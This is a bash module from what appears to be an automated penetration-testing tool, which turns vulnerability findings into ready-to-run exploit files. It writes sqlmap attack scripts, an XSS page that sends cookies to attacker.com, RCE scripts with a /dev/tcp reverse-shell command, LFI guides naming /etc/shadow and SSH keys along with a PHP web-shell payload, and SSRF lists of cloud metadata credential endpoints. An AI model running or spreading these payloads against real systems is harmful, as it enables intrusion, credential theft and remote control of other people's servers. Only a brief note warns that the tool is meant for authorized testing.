#!/bin/bash

# Result Formatter for Exploitation Data
# Formats findings for use by exploitation tools

source "$(dirname "${BASH_SOURCE[0]}")/logger.sh"
source "$(dirname "${BASH_SOURCE[0]}")/database.sh"

# Format all findings for exploitation
format_findings_for_exploitation() {
    local project_id=$1

    log_info "Formatting findings for exploitation"

    local exploit_dir="data/projects/${project_id}/exploits"
    mkdir -p "$exploit_dir"

    # Format each finding type
    format_sqli_exploits "$project_id" "$exploit_dir"
    format_xss_exploits "$project_id" "$exploit_dir"
    format_rce_exploits "$project_id" "$exploit_dir"
    format_lfi_exploits "$project_id" "$exploit_dir"
    format_ssrf_exploits "$project_id" "$exploit_dir"

    # Generate master exploit index
    generate_exploit_index "$project_id" "$exploit_dir"

    log_success "Exploitation data formatted in: $exploit_dir"
}

# Format SQLi findings for SQLMap
format_sqli_exploits() {
    local project_id=$1
    local exploit_dir=$2

    log_debug "Formatting SQLi exploits"

    # Get all SQLi findings
    db_execute "SELECT id, target, description FROM findings WHERE project_id=$project_id AND type LIKE 'sqli%'" 2>/dev/null | \
    while IFS='|' read -r finding_id target description; do
        [ -z "$finding_id" ] && continue

        # Extract URL and parameter
        local url=$(echo "$description" | grep -oP 'URL: \K.*' | head -1)
        local param=$(echo "$description" | grep -oP 'Parameter: \K\S+' | head -1)
        local payload=$(echo "$description" | grep -oP 'Payload: \K.*' | head -1)

        # Create SQLMap command file
        cat > "${exploit_dir}/sqli_${finding_id}.sh" <<EOF
#!/bin/bash
# SQLi Exploitation Script
# Finding ID: $finding_id
# Target: $url

echo "Exploiting SQLi vulnerability..."
echo "URL: $url"
echo "Parameter: $param"
echo ""

# Basic enumeration
sqlmap -u '$url' \\
       --batch \\
       --level=5 \\
       --risk=3 \\
       --technique=BEUSTQ \\
       --dbms=auto \\
       --threads=5 \\
       --banner \\
       --current-user \\
       --current-db \\
       --is-dba

# To dump databases:
# sqlmap -u '$url' --batch --dbs

# To dump specific database:
# sqlmap -u '$url' --batch -D database_name --dump
EOF

        chmod +x "${exploit_dir}/sqli_${finding_id}.sh"

        # Create JSON metadata
        cat > "${exploit_dir}/sqli_${finding_id}.json" <<EOF
{
  "finding_id": "$finding_id",
  "type": "sqli",
  "target": "$url",
  "parameter": "$param",
  "payload": "$payload",
  "exploitation_tool": "sqlmap",
  "exploitation_script": "sqli_${finding_id}.sh",
  "severity": "critical",
  "status": "ready_for_exploitation"
}
EOF
    done
}

# Format XSS findings for exploitation
format_xss_exploits() {
    local project_id=$1
    local exploit_dir=$2

    log_debug "Formatting XSS exploits"

    db_execute "SELECT id, target, description FROM findings WHERE project_id=$project_id AND type LIKE 'xss%'" 2>/dev/null | \
    while IFS='|' read -r finding_id target description; do
        [ -z "$finding_id" ] && continue

        local url=$(echo "$description" | grep -oP 'URL: \K.*' | head -1)
        local payload=$(echo "$description" | grep -oP 'Payload: \K.*' | head -1)

        # Create exploitation PoC
        cat > "${exploit_dir}/xss_${finding_id}.html" <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>XSS Exploitation - Finding #$finding_id</title>
</head>
<body>
    <h1>XSS Exploitation PoC</h1>
    <p><strong>Target:</strong> $url</p>
    <p><strong>Payload:</strong> <code>$payload</code></p>

    <h2>Cookie Stealing PoC</h2>
    <script>
        // Cookie exfiltration payload
        var payload = '$payload'.replace('alert(1)', 'fetch("https://attacker.com/steal?c="+document.cookie)');
        console.log('Exploit payload:', payload);
    </script>

    <h2>Exploitation URL</h2>
    <p><a href="$url" target="_blank">$url</a></p>

    <h3>Impact Scenarios:</h3>
    <ul>
        <li>Session hijacking (cookie theft)</li>
        <li>Keylogging</li>
        <li>Phishing</li>
        <li>Website defacement</li>
        <li>Drive-by downloads</li>
    </ul>
</body>
</html>
EOF

        cat > "${exploit_dir}/xss_${finding_id}.json" <<EOF
{
  "finding_id": "$finding_id",
  "type": "xss",
  "target": "$url",
  "payload": "$payload",
  "poc_file": "xss_${finding_id}.html",
  "severity": "high",
  "status": "ready_for_exploitation"
}
EOF
    done
}

# Format RCE findings for exploitation
format_rce_exploits() {
    local project_id=$1
    local exploit_dir=$2

    log_debug "Formatting RCE exploits"

    db_execute "SELECT id, target, description FROM findings WHERE project_id=$project_id AND type LIKE 'rce%'" 2>/dev/null | \
    while IFS='|' read -r finding_id target description; do
        [ -z "$finding_id" ] && continue

        local url=$(echo "$description" | grep -oP 'URL: \K.*' | head -1)
        local param=$(echo "$description" | grep -oP 'Parameter: \K\S+' | head -1)

        cat > "${exploit_dir}/rce_${finding_id}.sh" <<EOF
#!/bin/bash
# RCE Exploitation Script
# Finding ID: $finding_id

TARGET="$url"
PARAM="$param"

echo "RCE Exploitation Framework"
echo "=========================="
echo "Target: \$TARGET"
echo "Parameter: \$PARAM"
echo ""

# Basic command execution test
echo "[1] Testing whoami command:"
curl -s "\${TARGET}?\${PARAM}=\$(urlencode '; whoami')"

echo ""
echo "[2] Testing id command:"
curl -s "\${TARGET}?\${PARAM}=\$(urlencode '; id')"

echo ""
echo "[3] To get reverse shell, start listener:"
echo "    nc -lvnp 4444"
echo ""
echo "Then execute:"
echo "    curl '\${TARGET}?\${PARAM}=\$(urlencode '; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1')'"

function urlencode() {
    python3 -c "import urllib.parse; print(urllib.parse.quote('\$1'))"
}
EOF

        chmod +x "${exploit_dir}/rce_${finding_id}.sh"

        cat > "${exploit_dir}/rce_${finding_id}.json" <<EOF
{
  "finding_id": "$finding_id",
  "type": "rce",
  "target": "$url",
  "parameter": "$param",
  "exploitation_script": "rce_${finding_id}.sh",
  "severity": "critical",
  "impact": "complete_system_compromise",
  "status": "ready_for_exploitation"
}
EOF
    done
}

# Format LFI findings
format_lfi_exploits() {
    local project_id=$1
    local exploit_dir=$2

    log_debug "Formatting LFI exploits"

    db_execute "SELECT id, target, description FROM findings WHERE project_id=$project_id AND type LIKE 'lfi%'" 2>/dev/null | \
    while IFS='|' read -r finding_id target description; do
        [ -z "$finding_id" ] && continue

        local url=$(echo "$description" | grep -oP 'URL: \K.*' | head -1)

        cat > "${exploit_dir}/lfi_${finding_id}.txt" <<EOF
LFI Exploitation Guide - Finding #$finding_id
=============================================

Target: $url

Common Files to Extract:
-----------------------
Linux:
  - /etc/passwd
  - /etc/shadow (if privileged)
  - /etc/hosts
  - /var/log/apache2/access.log
  - /var/www/html/.env
  - ~/.ssh/id_rsa
  - ~/.bash_history

Windows:
  - C:\\windows\\win.ini
  - C:\\windows\\system32\\drivers\\etc\\hosts
  - C:\\inetpub\\wwwroot\\web.config

Log Poisoning:
-------------
If you can read log files, inject PHP code via User-Agent:
  curl -A "<?php system(\$_GET['cmd']); ?>" $url
  Then access log file with: $url&cmd=whoami

Wrappers (PHP):
--------------
  php://filter/convert.base64-encode/resource=/etc/passwd
  php://input (POST PHP code)
  data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

EOF

        cat > "${exploit_dir}/lfi_${finding_id}.json" <<EOF
{
  "finding_id": "$finding_id",
  "type": "lfi",
  "target": "$url",
  "exploitation_guide": "lfi_${finding_id}.txt",
  "severity": "high",
  "status": "ready_for_exploitation"
}
EOF
    done
}

# Format SSRF findings
format_ssrf_exploits() {
    local project_id=$1
    local exploit_dir=$2

    log_debug "Formatting SSRF exploits"

    db_execute "SELECT id, target, description FROM findings WHERE project_id=$project_id AND type LIKE 'ssrf%'" 2>/dev/null | \
    while IFS='|' read -r finding_id target description; do
        [ -z "$finding_id" ] && continue

        local url=$(echo "$description" | grep -oP 'URL: \K.*' | head -1)

        cat > "${exploit_dir}/ssrf_${finding_id}.txt" <<EOF
SSRF Exploitation Guide - Finding #$finding_id
==============================================

Target: $url

High-Value Targets:
------------------
AWS Metadata:
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

Google Cloud:
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
  (Requires header: Metadata-Flavor: Google)

Azure:
  http://169.254.169.254/metadata/instance?api-version=2021-02-01
  (Requires header: Metadata: true)

Internal Services:
  http://localhost:6379/ (Redis)
  http://localhost:5432/ (PostgreSQL)
  http://localhost:3306/ (MySQL)
  http://localhost:9200/ (Elasticsearch)

Internal Network Scan:
  http://192.168.1.1-254
  http://10.0.0.1-254

Protocol Smuggling:
  gopher://
  file://
  dict://
  ftp://

EOF

        cat > "${exploit_dir}/ssrf_${finding_id}.json" <<EOF
{
  "finding_id": "$finding_id",
  "type": "ssrf",
  "target": "$url",
  "exploitation_guide": "ssrf_${finding_id}.txt",
  "severity": "critical",
  "status": "ready_for_exploitation"
}
EOF
    done
}

# Generate master exploit index
generate_exploit_index() {
    local project_id=$1
    local exploit_dir=$2

    cat > "${exploit_dir}/INDEX.md" <<EOF
# Exploitation Index

Generated: $(date)
Project ID: $project_id

## Ready for Exploitation

This directory contains formatted exploitation data for all discovered vulnerabilities.

### File Types:
- **.sh** - Executable exploitation scripts
- **.html** - Proof-of-Concept HTML files
- **.txt** - Exploitation guides
- **.json** - Machine-readable metadata

### Vulnerabilities:

EOF

    # List all exploit files
    for json_file in "$exploit_dir"/*.json; do
        [ ! -f "$json_file" ] && continue

        if command -v jq &> /dev/null; then
            local type=$(jq -r '.type' "$json_file")
            local target=$(jq -r '.target' "$json_file")
            local severity=$(jq -r '.severity' "$json_file")

            echo "- **$type** [$severity] - $target" >> "${exploit_dir}/INDEX.md"
        fi
    done

    cat >> "${exploit_dir}/INDEX.md" <<EOF

### Usage:

1. Review finding details in database
2. Execute exploitation scripts with caution
3. Only test on authorized systems
4. Document all exploitation attempts

**WARNING:** Only use these exploits on systems you are authorized to test.

EOF
}

# Export Metasploit resource scripts
export_to_metasploit() {
    local project_id=$1

    log_info "Generating Metasploit resource scripts"

    local msf_dir="data/projects/${project_id}/metasploit"
    mkdir -p "$msf_dir"

    # Generate resource script for RCE findings
    cat > "${msf_dir}/auto_exploit.rc" <<'EOF'
# Metasploit Resource Script
# Auto-generated by LeKnight

setg VERBOSE true
setg LHOST YOUR_IP_HERE
setg LPORT 4444

# Load common exploits
# Customize based on findings

echo "Metasploit resource script loaded"
echo "Update LHOST and LPORT before running"
EOF

    log_success "Metasploit scripts: $msf_dir"
}

# Export functions
export -f format_findings_for_exploitation
export -f generate_exploit_index
export -f export_to_metasploit
